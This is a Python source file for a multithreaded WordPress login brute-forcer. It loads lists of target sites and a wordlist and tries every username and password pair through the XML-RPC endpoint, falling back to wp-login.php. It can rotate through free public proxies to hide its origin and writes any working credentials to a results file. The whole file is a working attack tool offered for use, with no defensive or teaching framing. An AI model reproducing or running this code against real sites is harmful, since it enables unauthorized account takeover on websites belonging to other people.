import os
import threading
import itertools
import time
import requests
import psutil
from queue import Queue
from dotenv import load_dotenv

load_dotenv()

class WordPressBruteForcer:
    PROXY_SOURCES = {
        'SOCKS5': 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
        'SOCKS4': 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
        'HTTP': 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
    }

    def __init__(self):
        self.base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.config = {
            'url_file': os.getenv('URL_FILE', os.path.join(self.base_dir, 'config', 'id.txt')),
            'wordlist_file': os.getenv('WORDLIST_FILE', os.path.join(self.base_dir, 'config', 'w.txt')),
            'proxy_type': os.getenv('PROXY_TYPE', 'HTTP').upper(),
            'threads': min(int(os.getenv('THREADS', 50)), 300),
            'use_proxy': os.getenv('USE_PROXY', 'false').lower() == 'true',
            'output_file': os.getenv('OUTPUT_FILE', os.path.join(self.base_dir, 'result', 'logged.txt')),
            'request_timeout': int(os.getenv('REQUEST_TIMEOUT', 20)),
            'retry_count': int(os.getenv('RETRY_COUNT', 2)),
            'delay': float(os.getenv('DELAY', 0.1))
        }

        # Resource management
        self.resources = {
            'urls': [],
            'wordlist': [],
            'proxies': [],
            'total_combinations': 0
        }

        # Threading setup
        self.queue = Queue()
        self.lock = threading.Lock()
        self.proxy_cycle = None
        self.found_credentials = set()
        self.start_time = time.time()

    def load_resources(self):
        try:
            # Load URLs
            with open(self.config['url_file'], 'r') as f:
                self.resources['urls'] = [self.normalize_url(line.strip()) for line in f if line.strip()]
            
            # Load wordlist
            with open(self.config['wordlist_file'], 'r') as f:
                self.resources['wordlist'] = [line.strip() for line in f if line.strip()]

            # Load proxies
            if self.config['use_proxy']:
                self.resources['proxies'] = self.fetch_proxies()
                if self.resources['proxies']:
                    print(f"[*] Loaded {len(self.resources['proxies'])} {self.config['proxy_type']} proxies")
                    self.proxy_cycle = itertools.cycle(self.resources['proxies'])
                else:
                    print("[!] Failed to load proxies, continuing without proxies")
                    self.config['use_proxy'] = False

            # Calculate combinations
            self.resources['total_combinations'] = len(self.resources['urls']) * (len(self.resources['wordlist']) ** 2)

        except FileNotFoundError as e:
            print(f"[!] File not found: {e.filename}")
            exit(1)

    def fetch_proxies(self):
        try:
            url = self.PROXY_SOURCES.get(self.config['proxy_type'])
            response = requests.get(url, timeout=15)
            proxies = [line.strip() for line in response.text.split('\n') if line.strip()]
            
            # Format proxies
            if self.config['proxy_type'].startswith('SOCKS'):
                scheme = 'socks5' if self.config['proxy_type'] == 'SOCKS5' else 'socks4'
                return [f"{scheme}://{proxy}" for proxy in proxies]
            return [f"http://{proxy}" for proxy in proxies]
        except Exception as e:
            print(f"[!] Proxy fetch failed: {str(e)}")
            return []

    def normalize_url(self, url):
        if not url.startswith('http'):
            url = f'http://{url}'
        if '/xmlrpc.php' not in url:
            url = url.rstrip('/') + '/xmlrpc.php'
        return url

    def generate_tasks(self):
        for url in self.resources['urls']:
            for user, pwd in itertools.product(self.resources['wordlist'], repeat=2):
                yield (url, user, pwd)

    def get_proxy(self):
        return next(self.proxy_cycle) if self.proxy_cycle else None

    def safe_request(self, method, url, **kwargs):
        for _ in range(self.config['retry_count']):
            try:
                response = requests.request(
                    method, url,
                    timeout=self.config['request_timeout'],
                    proxies={'http': self.get_proxy(), 'https': self.get_proxy()} if self.config['use_proxy'] else None,
                    **kwargs
                )
                return response
            except Exception as e:
                time.sleep(1)
        return None

    def check_xmlrpc(self, url):
        test_xml = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>"""
        response = self.safe_request('POST', url, data=test_xml)
        return response and response.status_code == 200 and 'methodResponse' in response.text

    def try_login(self, url, user, pwd):
        # XML-RPC attempt
        if self.check_xmlrpc(url):
            xml_data = f"""<?xml version="1.0"?>
            <methodCall>
                <methodName>wp.getUsersBlogs</methodName>
                <params>
                    <param><value>{user}</value></param>
                    <param><value>{pwd}</value></param>
                </params>
            </methodCall>"""
            
            response = self.safe_request('POST', url, data=xml_data)
            if response and 'isAdmin' in response.text:
                return True

        # WP-Login fallback
        login_url = url.replace('xmlrpc.php', 'wp-login.php')
        data = {'log': user, 'pwd': pwd, 'wp-submit': 'Login'}
        response = self.safe_request('POST', login_url, data=data)
        return response and ('Dashboard' in response.text or 'logout' in response.text.lower())

    def worker(self):
        while not self.queue.empty():
            url, user, pwd = self.queue.get()
            try:
                if self.try_login(url, user, pwd):
                    entry = f"{url}|{user}@{pwd}"
                    self.save_result(entry)
                time.sleep(self.config['delay'])
            finally:
                self.queue.task_done()

    def save_result(self, entry):
        with self.lock:
            if entry not in self.found_credentials:
                self.found_credentials.add(entry)
                with open(self.config['output_file'], 'a') as f:
                    f.write(entry + '\n')
                print(f"[+] Found: {entry}")

    def start_attack(self):
        # Warning system
        if self.config['threads'] > 100:
            print(f"\n{'!'*60}")
            print(f"[!] WARNING: High thread count ({self.config['threads']})")
            print(f"    Recommended max threads for 4GB RAM: 50-100")
            print(f"    Continuing in 5 seconds...")
            print(f"{'!'*60}")
            time.sleep(5)

        # Start attack
        print(f"\n{'='*60}")
        print(f"[*] Starting attack with configuration:")
        print(f"    Threads: {self.config['threads']}")
        print(f"    Targets: {len(self.resources['urls'])}")
        print(f"    Wordlist: {len(self.resources['wordlist'])}")
        print(f"    Total combinations: {self.resources['total_combinations']}")
        print(f"    Proxy: {self.config['proxy_type']} ({len(self.resources['proxies'])} servers)")
        print(f"{'='*60}\n")

        # Fill queue
        for task in self.generate_tasks():
            self.queue.put(task)

        # Start threads
        for _ in range(self.config['threads']):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()

        # Start monitoring
        self.start_monitoring()

    def start_monitoring(self):
        def monitor():
            while any(t.is_alive() for t in threading.enumerate()):
                mem = psutil.virtual_memory()
                done = self.resources['total_combinations'] - self.queue.qsize()
                elapsed = time.time() - self.start_time
                progress = (done / self.resources['total_combinations']) * 100 if self.resources['total_combinations'] > 0 else 0
                
                print(f"\r[Monitor] "
                      f"Progress: {done}/{self.resources['total_combinations']} ({progress:.2f}%) | "
                      f"Memory: {mem.percent}% | "
                      f"Threads: {threading.active_count()} | "
                      f"Elapsed: {elapsed:.2f}s", end='')
                time.sleep(1)

        threading.Thread(target=monitor, daemon=True).start()
        self.queue.join()
        print("\n\n[*] Attack completed!")